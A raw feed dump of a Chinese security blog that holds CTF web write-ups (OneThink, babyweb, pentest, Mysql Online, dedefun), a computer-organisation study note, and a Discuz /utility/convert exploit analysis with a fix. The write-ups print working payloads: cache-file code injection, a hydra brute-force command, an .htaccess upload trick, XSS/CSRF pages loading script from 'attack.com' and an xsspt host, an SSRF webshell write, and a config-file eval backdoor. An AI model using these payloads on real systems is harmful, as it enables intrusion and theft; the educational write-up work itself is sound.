class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现admin.php里面的命令执行,只需要生产一个admin的token就可以了,不过环境的原因,token总是生成失败,后面懒得写了,gugugu了无数年,把这篇文章发了吧,homework那题有时间再补吧..</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计组学习</title>
      <link href="/2018/07/24/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/07/24/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>提前学习一下,虽然也只是随意看下,开学再回顾一下,计组应该就不会再去看了</p><h2 id="第一章">第一章</h2><h3 id="几个层次">几个层次</h3><blockquote><p>1.应用软件 ==用户接口,如GUI之类== 2.系统软件(操作系统,数据抽象[编译器,汇编器,数据库管理系统等]和资源抽象[系统调用]) ==系统接口== 3.硬件系统(CPU,主存,输入输出,通信子系统) ==I/O和通信接口== 4.硬件设备(输入输出,通信设备)</p></blockquote><h4 id="软件层">软件层</h4><p>软件层可分为系统软件和应用软件 <strong>核心的系统软件</strong>:操作系统和编译器</p><h5 id="操作系统">操作系统</h5><p>操作系统是用户程序和硬件的接口,它提供服务和管理功能,其中最重要的功能有: -- 处理基本的输入输出操作 -- 分配存储空间及内存 -- 为多个程序同时使用计算机提供支持</p><h5 id="编译器">编译器</h5><p>完成另外一项核心功能,将用高级语言,如c,java写的程序编译成硬件能够执行的指令 软件层次整体来看,从高级语言到机器语言 -- 高级语言经过编译器被翻译成汇编语言,这个过程是一条高级语言对应多条汇编语言(把汇编转源码就是逆向咯?) -- 汇编语言经过汇编器被翻译成机器语言,对应是一条汇编转一条机器语言</p><h4 id="硬件层">硬件层</h4><p>不说了,放图自己体会...感觉又要学一门数字逻辑加强版 <img src="/images/2018/07/jizu-1.jpg" alt="blacsheep" /> 相关课程的安排:</p><h5 id="计算机体系结构">计算机体系结构</h5><p>-- 程序员所见到的计算机系统的属性、概念性的结构和功能特性 -- 指令系统、数据类型、寻址技术、I/O机理 也就是研究指令<strong>系统</strong></p><h5 id="计算机组成原理">计算机组成原理</h5><p>-- 实现计算机体系结构所体现的属性 -- 具体指令的逻辑实现 研究怎么设计<strong>具体的指令</strong></p><h5 id="逻辑与数字系统">逻辑与数字系统</h5><p>-- 计算机组成的物理实现 -- 具体的指令的物理实现 比如乘法指令需要乘法器,那么这里我们研究的就是乘法器的物理实现...</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客webwriteup</title>
      <link href="/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"/>
      <url>/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/</url>
      
        <content type="html"><![CDATA[<p>当天车上看了一会题,然后回来继续肝了一会,太累了睡着了...比较惨...今天就简单复现一下吧</p><h3 id="a-simple-cms">A Simple CMS</h3><p>进去之后发现是oneThink的框架 <img src="/images/2018/07/geek-1.jpg" alt="blacsheep" /> 百度一下漏洞,发现有个缓存洞,然后我就直接访问了那个缓存文件,发现不存在...然后就没看了..看了wp发现就是缓存做的不过缓存改了,然后给了个www.zip让我们看文件..可还行.. 思路就是以此注册两个账号 <code>%0a$a=$_GET[a];//</code>和<code>%0aecho `$a `;//</code> 然后再依次登录,然后缓存文件就有shell了,本地实验一下,然后发现文件在<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code> 然后就getshell了 burp的包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=/Home/User/register.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com/index.php?s=/Home/User/register.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=163bce1a13fc08-098d67d4284b6b-737356c-1fa400-163bce1a140248; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; pgv_pvi=3919248384; pgv_si=s6303365120; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1532146491,1532218918,1532239817; ci_session=e130184c93df8e71c7b9b914a9a57533887d6aeb; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1532267215; PHPSESSID=5umnh4fksrbf55vrvd9aokaik0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=%<span class="number">0</span>aecho `$a`;//&amp;password=<span class="number">123321</span>&amp;repassword=<span class="number">123321</span>&amp;email=<span class="number">12344121</span>%<span class="number">40</span>qq.com&amp;verify=elbpi</span></span><br></pre></td></tr></table></figure><p>flag在tmp下 <img src="/images/2018/07/geek-2.jpg" alt="blacsheep" /></p><h3 id="babyweb">babyweb</h3><p>hydra爆出mysql的root密码,虽然现在已经爆不了了..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 1q2w3e4r5t6y 117.50.1.145 mysql</span><br></pre></td></tr></table></figure><p>当然里面的-p可以换成-P然后跟字典文件,这个弱密码在某top3575弱密码里面有,是可以爆出来的... 然后从库里面发现账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:BabyWeb@my.lol</span><br><span class="line">password:babyweb@1990</span><br></pre></td></tr></table></figure><p>差一点点就猜出来了..我当时试的账号是BabyWeb@my.lol,密码试的是babyweb&amp;1990,有点可惜... 进去之后发现了一个文件上传的点,上传的名字不知道,这里需要连数据库然后这里说只有.htaccess可以传,那就传.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后传个abc结尾的文件就getshell了 不过需要连接数据库...现在已经连不上了,就不演示了 非常规解是读了/etc/shadow,然后用john解出ssh密码然后连上去拿flag的... <img src="/images/2018/07/geek-3.png" alt="blacsheep" /> 大佬大佬orz...</p><h3 id="pentest">pentest</h3><p>这个题...好吧感觉蛮坑的,扫目录得到/file/file.php,发现是个任意文件删除,删除掉config里面的install.lock然后就可以重装,重装的时候数据库配置插入一句话木马,可以本地先试试,然后再去打服务器,然后就shell了... <img src="/images/2018/07/geek-3.jpg" alt="blacsheep" /> 然后/tmp下找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6d791d58-5b04-4406-ad07-78a3dcac6802&#125;</span><br></pre></td></tr></table></figure><h3 id="mysql-online">Mysql Online</h3><p>这个题的xss思路蛮好的,虽然题目是个mysql而且我思路一开始直接就错了... 利用sql读的数据可以造成xss <img src="/images/2018/07/geek-4.jpg" alt="blacsheep" /> 当然你也可以unhex一下,一样的 在提交的content里面填自己的vps,然后得到返回 <img src="/images/2018/07/geek-5.jpg" alt="blacsheep" /> 可以看到登录页面,那么下面就是通过csrf来让他打到自己的页面咯,vps上构造页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/runsql.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sql&quot; value=&quot;select 0x3c736372697074207372633d68747470733a2f2f78737370742e636f6d2f32724f7a6c773f313533323333333438363e3c2f7363726970743e&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>简单的一个页面,让服务端向127.0.0.1的runsql.php发请求,服务端请求之后导致xss的payload生效...第一次打csrf,学习了学习了... 服务端访问之后,信息打到xsspt上,看一下结果 <img src="/images/2018/07/geek-6.jpg" alt="blacsheep" /> 发现cookie没东西,那我们去打一下admin_zzzz666.php的页面,得到结果 <img src="/images/2018/07/geek-7.jpg" alt="blacsheep" /> base解一下,得到页面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">403: only 127.0.0.1 can find me, so you can get this: http://127.0.0.1/runsql.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Online Mysql Run&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;Admin Index:&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;./static/img/iamsecret_555.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">I am l3m0n tree.</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现有个图片,直接访问,发现403了,那么去获取这个图片咯,github上面有个可以canvas画页面的工具,给个链接 <a href="https://github.com/Lz1y/frame2canvas" title="https://github.com/Lz1y/frame2canvas">https://github.com/Lz1y/frame2canvas</a> 然后修改一下配置 <img src="/images/2018/07/geek-9.jpg" alt="blacsheep" /> 然后payload,payload注意hex一下然后传到sql变量里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=&quot;myIframe&quot; src=&quot;admin_zzzz666.php&quot;&gt;&lt;/iframe&gt;&lt;script src=&quot;//attack.com/atk.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后写一个receive.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;log.txt&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>然后就可以收到log.txt了,然后base转图片就可以看到flag了 <img src="/images/2018/07/geek-8.jpg" alt="blacsheep" /></p><h3 id="dedefun">dedefun</h3><p>这个题其实还是远古的getimagesize暴路径那个点,不过有更新,就是getimagesize可以造成ssrf,比如说我在我的kali上配一个简单页面 <img src="/images/2018/07/geek-9-1.jpg" alt="blacsheep" /> 访问之后,发现在vps上收到显示 <img src="/images/2018/07/geek-10.jpg" alt="blacsheep" /> 然后就没有了,因为这道题就是个ssrf的点... 题目描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运维自己的网站，我还是喜欢用shell的方式，这样肯定没人能日进来了。</span><br><span class="line">1.php</span><br><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    die(&#x27;Who are you? your ip is:&#x27;.$_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么直接</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tags.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>love.lemon</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,ja;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>YDAL_2132_saltkey=umJCWaoK; YDAL_2132_lastvisit=1531231707; YDAL_2132_ulastactivity=8d9ffh%2BiVUvLiWxFVmAltTKPHq5V9hUJ5PvDa4s84r553KMhDZMx; YDAL_2132_auth=a017j1pf9qMN%2F5Pa1g7C6kyv3ik6f%2B7eqtppI5c6sSWzI0ggQU5wSkRNDoXuXqvSSMnI%2BN3ObxEMn7jaaNJW; YDAL_2132_nofavfid=1; YDAL_2132_lip=10.211.55.2%2C1531237092; YDAL_2132_home_diymode=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>251</span><br><span class="line"></span><br><span class="line"><span class="language-asciidoc">dopost=save&amp;_FILES[lsa][tmp_name]=<span class="link">http://127.0.0.1/1.php?a=assert%26b=file_put_contents($_GET</span>[<span class="string">1</span>],base64_decode($_GET[2]));%261=./uploads/soft/aaaa.php%262=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif</span></span><br></pre></td></tr></table></figure><p>就ok了,没啥好说的</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dz漏洞整理(持续更新)</title>
      <link href="/2018/07/22/dz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
      <url>/2018/07/22/dz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>近期碰到一些dz的漏洞,做了一下某春秋上面的题,大概的记录一下吧,顺便分析一下源码.</p><h3 id="utilityconvertindex.php利用">/utility/convert/index.php利用</h3><p>版本未知,之前看是dz的通杀,现在不知道了.. 首先访问这个链接 然后发现是个版本切换的界面 设置服务器信息的东西会写到配置文件,配置页面可连菜刀</p><h4 id="贴个exp">贴个exp</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/utility/convert/index.php?a=config&amp;source=d7.2_x2.0</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.test.ichunqiu</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>199</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">newconfig</span>[aaa%<span class="number">0</span>a%<span class="number">0</span>deval(CHR(<span class="number">101</span>).CHR(<span class="number">118</span>).CHR(<span class="number">97</span>).CHR(<span class="number">108</span>).CHR(<span class="number">40</span>).CHR(<span class="number">34</span>).CHR(<span class="number">36</span>).CHR(<span class="number">95</span>).CHR(<span class="number">80</span>).CHR(<span class="number">79</span>).CHR(<span class="number">83</span>).CHR(<span class="number">84</span>).CHR(<span class="number">91</span>).CHR(<span class="number">99</span>).CHR(<span class="number">93</span>).CHR(<span class="number">59</span>).CHR(<span class="number">34</span>).CHR(<span class="number">41</span>).CHR(<span class="number">59</span>));//]=aaaa&amp;submit=yes</span></span><br></pre></td></tr></table></figure><p>代码可以直接getshell,恶意代码写入/convert/data/config.inc.php文件中</p><h4 id="漏洞代码分析">漏洞代码分析</h4><p><code>\discuz\utility\convert\index.php</code> <img src="/images/2018/07/dz-1.png" alt="blacsheep" /> 查看do_config.inc.php,关键函数save_config_file <img src="/images/2018/07/dz-2.png" alt="blacsheep" /> 跟进<code>\discuz\utility\convert\include\global.func.php</code>去看函数 <img src="/images/2018/07/dz-3.png" alt="blacsheep" /> 关键函数getvars,继续跟进 <img src="/images/2018/07/dz-4.png" alt="blacsheep" /> 关键函数buildarray</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildarray</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$level</span> = <span class="number">0</span>, <span class="variable">$pre</span> = <span class="string">&#x27;$_config&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$ks</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ks</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$return</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$newline</span> = <span class="title function_ invoke__">str_pad</span>(<span class="string">&#x27;  CONFIG &#x27;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$key</span>).<span class="string">&#x27;  &#x27;</span>, <span class="number">50</span>, <span class="string">&#x27;-&#x27;</span>, STR_PAD_BOTH);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            这里是产生漏洞关键</span></span><br><span class="line"><span class="comment">            1. DISCUZ的本意是使用$config数组的key作为每一块配置区域的&quot;注释标题&quot;</span></span><br><span class="line"><span class="comment">            2. 写入配置文件的$newline依赖于$key，而$key是攻击者可控的</span></span><br><span class="line"><span class="comment">            3. 未对输入数据进行正确的边界处理，导致攻击者在输入数据中插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码</span></span><br><span class="line"><span class="comment">                1) 换行符</span></span><br><span class="line"><span class="comment">                2) ?&gt;</span></span><br><span class="line"><span class="comment">            这类定界符都是可以达到同样的效果的</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="variable">$return</span> .= <span class="string">&quot;\r\n// <span class="subst">$newline</span> //\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="title function_ invoke__">buildarray</span>(<span class="variable">$val</span>, <span class="variable">$level</span> + <span class="number">1</span>, <span class="variable">$pre</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$val</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\-?[1-9]\d*$/&quot;</span>, <span class="variable">$val</span>)  <span class="title function_ invoke__">strlen</span>(<span class="variable">$val</span>) &gt; <span class="number">12</span>) ? <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="title function_ invoke__">addcslashes</span>(<span class="variable">$val</span>, <span class="string">&#x27;\&#x27;\\&#x27;</span>).<span class="string">&#x27;\&#x27;&#x27;</span> : <span class="variable">$val</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="variable">$pre</span>.<span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>.<span class="string">&quot; = <span class="subst">$val</span>;\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="防御方法">防御方法</h4><p>可以把key里面的非字符数字下划线转成空字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildarray</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$level</span> = <span class="number">0</span>, <span class="variable">$pre</span> = <span class="string">&#x27;$_config&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$ks</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ks</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$return</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">//过滤掉$key中的非字母、数字及下划线字符</span></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^\w]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$newline</span> = <span class="title function_ invoke__">str_pad</span>(<span class="string">&#x27;  CONFIG &#x27;</span>.<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$key</span>).<span class="string">&#x27;  &#x27;</span>, <span class="number">50</span>, <span class="string">&#x27;-&#x27;</span>, STR_PAD_BOTH);</span><br><span class="line">            <span class="variable">$return</span> .= <span class="string">&quot;\r\n// <span class="subst">$newline</span> //\r\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ks</span>[<span class="variable">$level</span>] = <span class="variable">$ks</span>[<span class="variable">$level</span> - <span class="number">1</span>].<span class="string">&quot;[&#x27;<span class="subst">$key</span>&#x27;]&quot;</span>;</span><br><span class="line">            <span class="variable">$return</span> .= <span class="title function_ invoke__">buildarray</span>(<span class="variable">$val</span>, <span class="variable">$level</span> + <span class="number">1</span>, <span class="variable">$pre</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$val</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^\-?[1-9]\d*$/&quot;</span>, <span class="variable">$val</span>)  <span class="title 